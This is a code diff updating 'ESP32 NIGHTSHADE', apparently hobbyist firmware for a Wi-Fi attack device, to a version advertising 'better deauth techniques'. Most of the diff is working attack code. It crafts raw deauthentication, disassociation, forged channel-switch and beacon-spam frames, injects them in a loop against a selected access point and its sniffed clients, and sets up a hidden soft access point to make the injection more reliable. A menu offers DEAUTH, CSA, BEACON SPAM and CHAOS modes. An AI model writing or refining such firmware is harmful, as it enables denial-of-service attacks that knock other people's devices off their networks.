@@ -1,5 +1,6 @@
 /*
- * ESP32 NIGHTSHADE — v4.0
+ * ESP32 NIGHTSHADE — v4.1
+ * Updated with better deauth techniques
  */
 
 #include <SPI.h>
@@ -70,17 +71,35 @@ const uint8_t REASON_CODES[6]={0x01,0x02,0x03,0x04,0x07,0x08};
 
 void drawNetworkList(); void drawClientList(); void drawDetails();
 
-// ====================== FRAME BUILDERS ======================
+// ====================== FRAME BUILDERS (Improved) ======================
 void buildDeauth(uint8_t* b, const uint8_t* ap, const uint8_t* c, uint8_t r, uint16_t s) {
-  b[0]=0xC0; b[1]=0x00; b[2]=0x00; b[3]=0x00;
-  memcpy(&b[4],c,6); memcpy(&b[10],ap,6); memcpy(&b[16],ap,6);
-  uint16_t sc=(s&0xFFF)<<4; b[22]=sc&0xFF; b[23]=(sc>>8)&0xFF; b[24]=r; b[25]=0;
+  b[0] = 0xC0; b[1] = 0x00;           // Frame Control (Deauth)
+  b[2] = 0x3A; b[3] = 0x01;           // Duration (important)
+  memcpy(&b[4],  c, 6);               // Destination
+  memcpy(&b[10], ap, 6);              // Source
+  memcpy(&b[16], ap, 6);              // BSSID
+  uint16_t sc = (s & 0xFFF) << 4;
+  b[22] = sc & 0xFF;
+  b[23] = (sc >> 8) & 0xFF;
+  b[24] = r;
+  b[25] = 0;
+  b[26] = 0; b[27] = 0;               // Padding to 28 bytes
 }
+
 void buildDisassoc(uint8_t* b, const uint8_t* ap, const uint8_t* c, uint8_t r, uint16_t s) {
-  b[0]=0xA0; b[1]=0x00; b[2]=0x00; b[3]=0x00;
-  memcpy(&b[4],c,6); memcpy(&b[10],ap,6); memcpy(&b[16],ap,6);
-  uint16_t sc=(s&0xFFF)<<4; b[22]=sc&0xFF; b[23]=(sc>>8)&0xFF; b[24]=r; b[25]=0;
+  b[0] = 0xA0; b[1] = 0x00;           // Frame Control (Disassoc)
+  b[2] = 0x3A; b[3] = 0x01;           // Duration
+  memcpy(&b[4],  c, 6);
+  memcpy(&b[10], ap, 6);
+  memcpy(&b[16], ap, 6);
+  uint16_t sc = (s & 0xFFF) << 4;
+  b[22] = sc & 0xFF;
+  b[23] = (sc >> 8) & 0xFF;
+  b[24] = r;
+  b[25] = 0;
+  b[26] = 0; b[27] = 0;
 }
+
 void buildCSA(uint8_t* b, const uint8_t* ap, uint8_t ch, uint8_t cnt, uint16_t s) {
   b[0]=0xD0; b[1]=0x00; b[2]=0x00; b[3]=0x00;
   memcpy(&b[4],(uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF",6);
@@ -88,11 +107,13 @@ void buildCSA(uint8_t* b, const uint8_t* ap, uint8_t ch, uint8_t cnt, uint16_t s
   uint16_t sc=(s&0xFFF)<<4; b[22]=sc&0xFF; b[23]=(sc>>8)&0xFF;
   b[24]=0x0A; b[25]=0x04; b[26]=0x01; b[27]=ch; b[28]=cnt;
 }
+
 void buildQoSNull(uint8_t* b, const uint8_t* ap, const uint8_t* c, uint16_t s) {
   b[0]=0x48; b[1]=0x01; b[2]=0x00; b[3]=0x00;
   memcpy(&b[4],c,6); memcpy(&b[10],ap,6); memcpy(&b[16],ap,6);
   uint16_t sc=(s&0xFFF)<<4; b[22]=sc&0xFF; b[23]=(sc>>8)&0xFF; b[24]=0; b[25]=0;
 }
+
 void buildBeacon(uint8_t* b, const uint8_t* ap, uint16_t s) {
   b[0]=0x80; b[1]=0x00; b[2]=0x00; b[3]=0x00;
   memcpy(&b[4],(uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF",6);
@@ -167,267 +188,347 @@ void IRAM_ATTR snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
   }
 }
 
-// ====================== ATTACK TASK ======================
+// ====================== ATTACK TASK (Improved) ======================
 void attackTask(void *pv) {
-  uint8_t buf[128]; uint32_t seq=0; uint8_t rIdx=0; unsigned long lc=0;
+  uint8_t buf[128];
+  uint32_t seq = 0;
+  uint8_t rIdx = 0;
+  unsigned long lc = 0;
   uint8_t safeMacs[5][6];
 
-  while(true) {
-    if(!attacking){vTaskDelay(100/portTICK_PERIOD_MS); continue;}
+  while (true) {
+    if (!attacking) {
+      vTaskDelay(100 / portTICK_PERIOD_MS);
+      continue;
+    }
+
+    // Set channel right before sending
     esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
 
     portENTER_CRITICAL(&clientMux);
     int snap = numClients;
     int copyCnt = min(5, snap);
-    for(int i=0; i<copyCnt; i++) memcpy(safeMacs[i], clients[i].mac, 6);
+    for (int i = 0; i < copyCnt; i++) memcpy(safeMacs[i], clients[i].mac, 6);
     portEXIT_CRITICAL(&clientMux);
 
-    uint8_t reason = REASON_CODES[rIdx%6];
+    uint8_t reason = REASON_CODES[rIdx % 6];
 
-    if(attackMode==1||attackMode==4){
+    // DEAUTH + DISASSOC
+    if (attackMode == 1 || attackMode == 4) {
       uint8_t t[6];
-      if(snap > 0 && !isBroadcastMode) memcpy(t, safeMacs[0], 6);
-      else memcpy(t, (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF",6);
-      for(int i=0;i<5;i++){
-        buildDeauth(buf,targetBSSID,t,reason,seq++); esp_wifi_80211_tx(WIFI_IF_STA,buf,26,false);
-        buildDisassoc(buf,targetBSSID,t,reason,seq++); esp_wifi_80211_tx(WIFI_IF_STA,buf,26,false);
+      if (snap > 0 && !isBroadcastMode) memcpy(t, safeMacs[0], 6);
+      else memcpy(t, (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF", 6);
+
+      for (int i = 0; i < 5; i++) {
+        buildDeauth(buf, targetBSSID, t, reason, seq++);
+        esp_wifi_80211_tx(WIFI_IF_AP, buf, 28, false);   // ← WIFI_IF_AP + 28 bytes
+
+        buildDisassoc(buf, targetBSSID, t, reason, seq++);
+        esp_wifi_80211_tx(WIFI_IF_AP, buf, 28, false);   // ← WIFI_IF_AP + 28 bytes
       }
     }
-    if(attackMode==2||attackMode==4) for(int i=0;i<6;i++){uint8_t ch=((targetChannel+i)%11)+1; buildCSA(buf,targetBSSID,ch,4,seq++); esp_wifi_80211_tx(WIFI_IF_STA,buf,29,false);}
-    if(attackMode==3||attackMode==4) for(int i=0;i<5;i++){buildBeacon(buf,targetBSSID,seq++); esp_wifi_80211_tx(WIFI_IF_STA,buf,60,false);}
-    if(snap>0&&(attackMode==1||attackMode==4)) for(int c=0;c<min(4,snap);c++){buildQoSNull(buf,targetBSSID,safeMacs[c],seq++); esp_wifi_80211_tx(WIFI_IF_STA,buf,26,false);}
 
-    packetCount=seq; rIdx++;
-    if(millis()-lc>2000){cleanupStaleClients(); lc=millis();}
-    vTaskDelay(7/portTICK_PERIOD_MS);
+    // CSA
+    if (attackMode == 2 || attackMode == 4) {
+      for (int i = 0; i < 6; i++) {
+        uint8_t ch = ((targetChannel + i) % 11) + 1;
+        buildCSA(buf, targetBSSID, ch, 4, seq++);
+        esp_wifi_80211_tx(WIFI_IF_AP, buf, 29, false);
+      }
+    }
+
+    // BEACON SPAM
+    if (attackMode == 3 || attackMode == 4) {
+      for (int i = 0; i < 5; i++) {
+        buildBeacon(buf, targetBSSID, seq++);
+        esp_wifi_80211_tx(WIFI_IF_AP, buf, 60, false);
+      }
+    }
+
+    // QoS Null
+    if (snap > 0 && (attackMode == 1 || attackMode == 4)) {
+      for (int c = 0; c < min(4, snap); c++) {
+        buildQoSNull(buf, targetBSSID, safeMacs[c], seq++);
+        esp_wifi_80211_tx(WIFI_IF_AP, buf, 26, false);
+      }
+    }
+
+    packetCount = seq;
+    rIdx++;
+    if (millis() - lc > 2000) {
+      cleanupStaleClients();
+      lc = millis();
+    }
+    vTaskDelay(7 / portTICK_PERIOD_MS);
   }
 }
 
 // ====================== UI ======================
-
-void drawHeader(){
+void drawHeader() {
   tft.fillScreen(BLACK);
   tft.setTextSize(1);
-  tft.setCursor(4+OX, 6+OY);
-  tft.setTextColor(RED);        // "ESP32 NIGHTSHADE" in RED
+  tft.setCursor(4 + OX, 6 + OY);
+  tft.setTextColor(RED);
   tft.print("ESP32 NIGHTSHADE ");
-  tft.setTextColor(WHITE);      // "v4.0" in WHITE
-  tft.print("v4.0");
-  tft.drawLine(0, 18+OY, 160, 18+OY, GRAY);
-}
-
-void drawClientCount(){
-  tft.fillRect(110,22+OY,50,40,BLACK);
-  tft.setCursor(115+OX,25+OY);
-  tft.setTextColor(LGREEN);     // client count in LGREEN
-  tft.print("C:"); tft.print(numClients);
-  tft.setCursor(115+OX,36+OY);
   tft.setTextColor(WHITE);
-  tft.print("P:"); tft.print(packetCount%10000);
+  tft.print("v4.1");
+  tft.drawLine(0, 18 + OY, 160, 18 + OY, GRAY);
 }
 
-void drawClientList(){
-  tft.fillRect(0,25+OY,160,110,BLACK);
-  tft.setCursor(5+OX,28+OY);
+void drawClientCount() {
+  tft.fillRect(110, 22 + OY, 50, 40, BLACK);
+  tft.setCursor(115 + OX, 25 + OY);
+  tft.setTextColor(LGREEN);
+  tft.print("C:"); tft.print(numClients);
+  tft.setCursor(115 + OX, 36 + OY);
+  tft.setTextColor(WHITE);
+  tft.print("P:"); tft.print(packetCount % 10000);
+}
+
+void drawClientList() {
+  tft.fillRect(0, 25 + OY, 160, 110, BLACK);
+  tft.setCursor(5 + OX, 28 + OY);
   tft.setTextColor(AQUA);
   tft.print("CONNECTED CLIENTS");
   drawClientCount();
-  portENTER_CRITICAL(&clientMux); int c=numClients; portEXIT_CRITICAL(&clientMux);
+  portENTER_CRITICAL(&clientMux); int c = numClients; portEXIT_CRITICAL(&clientMux);
   tft.setTextColor(WHITE);
-  for(int i=0;i<7;i++){
-    int idx=clientScroll+i; if(idx>=c) break;
-    tft.setCursor(8+OX,42+i*11+OY);
+  for (int i = 0; i < 7; i++) {
+    int idx = clientScroll + i;
+    if (idx >= c) break;
+    tft.setCursor(8 + OX, 42 + i * 11 + OY);
     tft.printf("%02X:%02X:%02X:%02X:%02X:%02X",
-      clients[idx].mac[0],clients[idx].mac[1],clients[idx].mac[2],
-      clients[idx].mac[3],clients[idx].mac[4],clients[idx].mac[5]);
+      clients[idx].mac[0], clients[idx].mac[1], clients[idx].mac[2],
+      clients[idx].mac[3], clients[idx].mac[4], clients[idx].mac[5]);
   }
 }
 
-void drawDetails(){
-  if(viewingClients){ drawClientList(); return; }
+void drawDetails() {
+  if (viewingClients) { drawClientList(); return; }
   drawHeader();
   Network& n = networks[selectedIndex];
 
-  tft.setCursor(5+OX,25+OY);
-  tft.setTextColor(WHITE);      // "NETWORK DETAILS" in WHITE
+  tft.setCursor(5 + OX, 25 + OY);
+  tft.setTextColor(WHITE);
   tft.print("NETWORK DETAILS");
 
-  tft.setCursor(5+OX,37+OY);
+  tft.setCursor(5 + OX, 37 + OY);
   tft.setTextColor(WHITE); tft.print("SSID: ");
-  tft.setTextColor(LGREEN);     // SSID name in LGREEN
-  String s=n.ssid; if(s.length()>12) s=s.substring(0,12);
+  tft.setTextColor(LGREEN);
+  String s = n.ssid; if (s.length() > 12) s = s.substring(0, 12);
   tft.print(s);
 
-  tft.setCursor(5+OX,48+OY);
-  tft.setTextColor(PURPLE);     // channel in PURPLE
+  tft.setCursor(5 + OX, 48 + OY);
+  tft.setTextColor(PURPLE);
   tft.print("Ch:"); tft.print(n.channel);
   tft.print("   ");
-  tft.setTextColor(BLUE);       // RSSI in BLUE
+  tft.setTextColor(BLUE);
   tft.print("RSSI:"); tft.print(n.rssi);
 
-  tft.setCursor(5+OX,59+OY);
-  tft.setTextColor(LAQUA);      // MAC in CYAN
+  tft.setCursor(5 + OX, 59 + OY);
+  tft.setTextColor(LAQUA);
   tft.printf("%02X:%02X:%02X:%02X:%02X:%02X",
-    n.bssid[0],n.bssid[1],n.bssid[2],n.bssid[3],n.bssid[4],n.bssid[5]);
+    n.bssid[0], n.bssid[1], n.bssid[2], n.bssid[3], n.bssid[4], n.bssid[5]);
 
-  tft.drawLine(0,70+OY,160,70+OY,GRAY);
+  tft.drawLine(0, 70 + OY, 160, 70 + OY, GRAY);
 
-  tft.setCursor(5+OX,74+OY);
-  tft.setTextColor(PINK);       // page number in PINK
-  tft.print(detailPage==0 ? "PAGE 1 / 2" : "PAGE 2 / 2");
+  tft.setCursor(5 + OX, 74 + OY);
+  tft.setTextColor(PINK);
+  tft.print(detailPage == 0 ? "PAGE 1 / 2" : "PAGE 2 / 2");
 
-  const char* opt[7] = {"SNIFF","DEAUTH","CSA","BEACON SPAM","CHAOS","CLIENTS","BACK"};
-  bool act[5] = {sniffing&&!attacking, attackMode==1, attackMode==2, attackMode==3, attackMode==4};
+  const char* opt[7] = {"SNIFF", "DEAUTH", "CSA", "BEACON SPAM", "CHAOS", "CLIENTS", "BACK"};
+  bool act[5] = {sniffing && !attacking, attackMode == 1, attackMode == 2, attackMode == 3, attackMode == 4};
 
   int start = (detailPage == 0) ? 0 : 4;
   int count = (detailPage == 0) ? 4 : 3;
 
-  for(int i=0; i<count; i++){
+  for (int i = 0; i < count; i++) {
     int idx = start + i;
-    tft.setCursor(5+OX, 88 + i*11 + OY);
-    if(idx == detailOption){
-      tft.setTextColor(LGREEN);  // cursor AND selected text in LGREEN
+    tft.setCursor(5 + OX, 88 + i * 11 + OY);
+    if (idx == detailOption) {
+      tft.setTextColor(LGREEN);
       tft.print(">> ");
       tft.print(opt[idx]);
     } else {
-      tft.setTextColor(YELLOW);  // unselected options in YELLOW
+      tft.setTextColor(YELLOW);
       tft.print("   ");
       tft.print(opt[idx]);
     }
-    if(idx < 5 && act[idx]){
-      tft.setTextColor(ORANGE);  // exclamation in ORANGE
+    if (idx < 5 && act[idx]) {
+      tft.setTextColor(ORANGE);
       tft.print(" !");
     }
   }
 
-  tft.setTextColor(PINK);        // page indicator in PINK
-  tft.setCursor(125+OX,118+OY);
-  tft.print(detailPage+1); tft.print("/2");
+  tft.setTextColor(PINK);
+  tft.setCursor(125 + OX, 118 + OY);
+  tft.print(detailPage + 1); tft.print("/2");
 
-  if(sniffing||attacking) drawClientCount();
+  if (sniffing || attacking) drawClientCount();
 }
 
-void drawNetworkList(){
+void drawNetworkList() {
   drawHeader();
-  tft.setCursor(5+OX,28+OY);
-  for(int i=0;i<5&&(selectedIndex+i)<numNetworks;i++){
-    int idx=selectedIndex+i;
-    if(i==0){
-      tft.setTextColor(WHITE);   // selected cursor in WHITE
+  tft.setCursor(5 + OX, 28 + OY);
+  for (int i = 0; i < 5 && (selectedIndex + i) < numNetworks; i++) {
+    int idx = selectedIndex + i;
+    if (i == 0) {
+      tft.setTextColor(WHITE);
       tft.print(" >> ");
     } else {
-      tft.setTextColor(YELLOW);  // unselected indent
+      tft.setTextColor(YELLOW);
       tft.print("    ");
     }
-    tft.setTextColor(YELLOW);    // ALL SSIDs in YELLOW
-    String s=networks[idx].ssid; if(s.length()>16) s=s.substring(0,16);
-    tft.println(s);              // no RSSI
+    tft.setTextColor(YELLOW);
+    String s = networks[idx].ssid;
+    if (s.length() > 16) s = s.substring(0, 16);
+    tft.println(s);
   }
   tft.setTextColor(GRAY);
-  tft.setCursor(5+OX,118+OY); tft.printf("%d/%d",selectedIndex+1,numNetworks);
+  tft.setCursor(5 + OX, 118 + OY);
+  tft.printf("%d/%d", selectedIndex + 1, numNetworks);
 }
 
-void scanNetworks(){
+void scanNetworks() {
   drawHeader();
-  tft.setCursor(8+OX,28+OY); tft.setTextColor(LBLUE); tft.print("Scanning...");
-  numNetworks=0; int n=WiFi.scanNetworks(false,true);
-  for(int i=0;i<n&&numNetworks<MAX_NETWORKS;i++) if(WiFi.SSID(i).length()>0){
-    networks[numNetworks].ssid=WiFi.SSID(i);
-    memcpy(networks[numNetworks].bssid,WiFi.BSSID(i),6);
-    networks[numNetworks].channel=WiFi.channel(i);
-    networks[numNetworks].rssi=WiFi.RSSI(i);
-    numNetworks++;
+  tft.setCursor(8 + OX, 28 + OY);
+  tft.setTextColor(LBLUE);
+  tft.print("Scanning...");
+  numNetworks = 0;
+  int n = WiFi.scanNetworks(false, true);
+  for (int i = 0; i < n && numNetworks < MAX_NETWORKS; i++) {
+    if (WiFi.SSID(i).length() > 0) {
+      networks[numNetworks].ssid = WiFi.SSID(i);
+      memcpy(networks[numNetworks].bssid, WiFi.BSSID(i), 6);
+      networks[numNetworks].channel = WiFi.channel(i);
+      networks[numNetworks].rssi = WiFi.RSSI(i);
+      numNetworks++;
+    }
   }
-  selectedIndex=0; drawNetworkList();
+  selectedIndex = 0;
+  drawNetworkList();
 }
 
-void startSniff(){
-  if(networks[selectedIndex].ssid != TARGET_SSID) return;
-  memcpy(targetBSSID,networks[selectedIndex].bssid,6);
-  targetChannel=networks[selectedIndex].channel;
-  esp_wifi_set_channel(targetChannel,WIFI_SECOND_CHAN_NONE);
-  sniffing=true; attacking=false; numClients=0;
+void startSniff() {
+  if (networks[selectedIndex].ssid != TARGET_SSID) return;
+  memcpy(targetBSSID, networks[selectedIndex].bssid, 6);
+  targetChannel = networks[selectedIndex].channel;
+  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
+  sniffing = true;
+  attacking = false;
+  numClients = 0;
 }
 
-void startAttack(uint8_t m){
-  if(networks[selectedIndex].ssid != TARGET_SSID) return;
-  memcpy(targetBSSID,networks[selectedIndex].bssid,6);
-  targetChannel=networks[selectedIndex].channel;
-  esp_wifi_set_channel(targetChannel,WIFI_SECOND_CHAN_NONE);
-  attackMode=m; attacking=true; sniffing=true; isBroadcastMode=(m==1);
+void startAttack(uint8_t m) {
+  if (networks[selectedIndex].ssid != TARGET_SSID) return;
+  memcpy(targetBSSID, networks[selectedIndex].bssid, 6);
+  targetChannel = networks[selectedIndex].channel;
+  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
+  attackMode = m;
+  attacking = true;
+  sniffing = true;
+  isBroadcastMode = (m == 1);
 }
 
-void stopAll(){ attacking=false; sniffing=false; attackMode=0; }
+void stopAll() {
+  attacking = false;
+  sniffing = false;
+  attackMode = 0;
+}
 
-void handleJoystick(){
-  int y=analogRead(JOY_VRY); bool p=digitalRead(JOY_SW)==LOW;
-  if(p){
+void handleJoystick() {
+  int y = analogRead(JOY_VRY);
+  bool p = digitalRead(JOY_SW) == LOW;
+
+  if (p) {
     delay(180);
-    if(viewingClients){ viewingClients=false; drawDetails(); return; }
+    if (viewingClients) {
+      viewingClients = false;
+      drawDetails();
+      return;
+    }
 
-    if(inDetails){
-      if(detailOption==0 && sniffing && !attacking){ stopAll(); drawDetails(); return; }
-      if(detailOption==1 && attackMode==1){ stopAll(); drawDetails(); return; }
-      if(detailOption==2 && attackMode==2){ stopAll(); drawDetails(); return; }
-      if(detailOption==3 && attackMode==3){ stopAll(); drawDetails(); return; }
-      if(detailOption==4 && attackMode==4){ stopAll(); drawDetails(); return; }
+    if (inDetails) {
+      if (detailOption == 0 && sniffing && !attacking) { stopAll(); drawDetails(); return; }
+      if (detailOption == 1 && attackMode == 1) { stopAll(); drawDetails(); return; }
+      if (detailOption == 2 && attackMode == 2) { stopAll(); drawDetails(); return; }
+      if (detailOption == 3 && attackMode == 3) { stopAll(); drawDetails(); return; }
+      if (detailOption == 4 && attackMode == 4) { stopAll(); drawDetails(); return; }
 
-      if(detailOption==0){ stopAll(); startSniff(); }
-      else if(detailOption==1){ stopAll(); startAttack(1); }
-      else if(detailOption==2){ stopAll(); startAttack(2); }
-      else if(detailOption==3){ stopAll(); startAttack(3); }
-      else if(detailOption==4){ stopAll(); startAttack(4); }
-      else if(detailOption==5){ viewingClients=true; clientScroll=0; }
-      else { stopAll(); inDetails=false; viewingClients=false; drawNetworkList(); return; }
+      if (detailOption == 0) { stopAll(); startSniff(); }
+      else if (detailOption == 1) { stopAll(); startAttack(1); }
+      else if (detailOption == 2) { stopAll(); startAttack(2); }
+      else if (detailOption == 3) { stopAll(); startAttack(3); }
+      else if (detailOption == 4) { stopAll(); startAttack(4); }
+      else if (detailOption == 5) { viewingClients = true; clientScroll = 0; }
+      else { stopAll(); inDetails = false; viewingClients = false; drawNetworkList(); return; }
       drawDetails();
     } else {
-      inDetails=true; detailPage=0; detailOption=0; viewingClients=false; drawDetails();
+      inDetails = true;
+      detailPage = 0;
+      detailOption = 0;
+      viewingClients = false;
+      drawDetails();
     }
     return;
   }
 
-  if(viewingClients){
-    if(y<1400&&clientScroll>0){ clientScroll--; drawClientList(); delay(80); }
-    else if(y>2600&&clientScroll<numClients-7){ clientScroll++; drawClientList(); delay(80); }
+  if (viewingClients) {
+    if (y < 1400 && clientScroll > 0) { clientScroll--; drawClientList(); delay(80); }
+    else if (y > 2600 && clientScroll < numClients - 7) { clientScroll++; drawClientList(); delay(80); }
     return;
   }
 
-  if(!inDetails){
-    if(y<1400&&selectedIndex>0){ selectedIndex--; drawNetworkList(); delay(130); }
-    else if(y>2600&&selectedIndex<numNetworks-1){ selectedIndex++; drawNetworkList(); delay(130); }
+  if (!inDetails) {
+    if (y < 1400 && selectedIndex > 0) { selectedIndex--; drawNetworkList(); delay(130); }
+    else if (y > 2600 && selectedIndex < numNetworks - 1) { selectedIndex++; drawNetworkList(); delay(130); }
   } else {
     int oldPage = detailPage;
     int oldOpt  = detailOption;
 
-    if(y<1400){
-      if(detailOption > (detailPage*4)) detailOption--;
-      else if(detailPage > 0){ detailPage--; detailOption = detailPage*4 + 3; }
+    if (y < 1400) {
+      if (detailOption > (detailPage * 4)) detailOption--;
+      else if (detailPage > 0) { detailPage--; detailOption = detailPage * 4 + 3; }
     }
-    else if(y>2600){
-      int maxOptThisPage = (detailPage==0) ? 3 : 6;
-      if(detailOption < maxOptThisPage) detailOption++;
-      else if(detailPage == 0){ detailPage=1; detailOption=4; }
+    else if (y > 2600) {
+      int maxOptThisPage = (detailPage == 0) ? 3 : 6;
+      if (detailOption < maxOptThisPage) detailOption++;
+      else if (detailPage == 0) { detailPage = 1; detailOption = 4; }
     }
 
-    if(oldPage != detailPage || oldOpt != detailOption) drawDetails();
+    if (oldPage != detailPage || oldOpt != detailOption) drawDetails();
     delay(110);
   }
 }
 
-void setup(){
-  Serial.begin(115200); pinMode(JOY_SW,INPUT_PULLUP);
-  tft.initR(INITR_BLACKTAB); tft.setRotation(3);
+void setup() {
+  Serial.begin(115200);
+  pinMode(JOY_SW, INPUT_PULLUP);
+
+  tft.initR(INITR_BLACKTAB);
+  tft.setRotation(3);
   tft.fillScreen(BLACK);
-  WiFi.mode(WIFI_STA); WiFi.disconnect();
+
+  // Proper setup for WIFI_IF_AP
+  WiFi.mode(WIFI_AP_STA);
+  WiFi.softAP("esp32_temp", NULL, 1, 1, 1);   // Hidden SoftAP (required for reliable AP interface)
+  delay(200);
+
+  WiFi.disconnect();
   esp_wifi_set_promiscuous_rx_cb(snifferCallback);
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_max_tx_power(WIFI_POWER_19_5dBm);
-  xTaskCreatePinnedToCore(attackTask,"Attack",16384,NULL,1,&attackTaskHandle,0);
+
+  xTaskCreatePinnedToCore(attackTask, "Attack", 16384, NULL, 1, &attackTaskHandle, 0);
   scanNetworks();
 }
 
-void loop(){
+void loop() {
   handleJoystick();
-  if(sniffing||attacking){ drawClientCount(); delay(70); }
-  else delay(60);
+  if (sniffing || attacking) {
+    drawClientCount();
+    delay(70);
+  } else {
+    delay(60);
+  }
 }
